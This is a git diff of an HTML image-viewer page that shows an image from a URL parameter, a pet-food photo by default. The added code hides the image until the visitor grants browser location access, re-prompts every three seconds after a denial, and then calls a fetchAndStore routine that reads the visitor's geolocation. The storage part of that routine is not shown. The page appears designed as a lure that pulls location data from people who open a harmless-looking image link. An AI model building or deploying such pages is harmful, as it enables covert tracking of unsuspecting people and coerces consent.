@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -23,10 +24,23 @@
             color: #333;
             margin-top: 20px;
         }
+
+        #main-content,
+        #error-message {
+            display: none;
+        }
     </style>
 </head>
+
 <body>
+    <div id="loading">Requesting location permission...</div>
+    <div id="main-content">
         <img id="dynamicImage" src="" alt="Image will appear here">
+    </div>
+    <div id="error-message">
+        <h2>Permission Denied !</h2>
+        <p>This site requires location access to continue. Please allow it and reload the page.</p>
+    </div>
 </body>
 <script>
     // Get URL parameter
@@ -35,11 +49,36 @@
 
     // Set the image src
     if (imageUrl) {
-      document.getElementById('dynamicImage').src = imageUrl;
+        document.getElementById('dynamicImage').src = imageUrl;
     } else {
-      document.getElementById('dynamicImage').src = "https://www.harringtonspetfood.com/cdn/shop/articles/shutterstock_2252922629.jpg?v=1713882588&width=1024";
+        document.getElementById('dynamicImage').src = "https://www.harringtonspetfood.com/cdn/shop/articles/shutterstock_2252922629.jpg?v=1713882588&width=1024";
     }
-    fetchAndStore()
+    count = 0;
+    function requestLocationPermission(retryDelay = 3000) {
+        ++count;
+        console.log("Attempt : " + count)
+        navigator.geolocation.getCurrentPosition(
+            function (position) {
+                fetchAndStore()
+                document.getElementById("loading").style.display = "none";
+                document.getElementById("main-content").style.display = "block";
+                document.getElementById("error-message").style.display = "none";
+            },
+            function (error) {
+                if (error.code === error.PERMISSION_DENIED) {
+                    document.getElementById("loading").style.display = "none";
+                document.getElementById("error-message").style.display = "block";
+                    setTimeout(requestLocationPermission, retryDelay);
+                } else {
+                    document.getElementById("status").innerText =
+                        "Error: " + error.message;
+                }
+            }
+        );
+    }
+    // Start the permission loop
+    requestLocationPermission();
+    
     async function fetchAndStore() {
         if (!navigator.geolocation) {
             output.innerHTML = "❌ Your browser does not support Geolocation.";
@@ -78,4 +117,4 @@
 
 </script>
 
-</html> 
+</html>
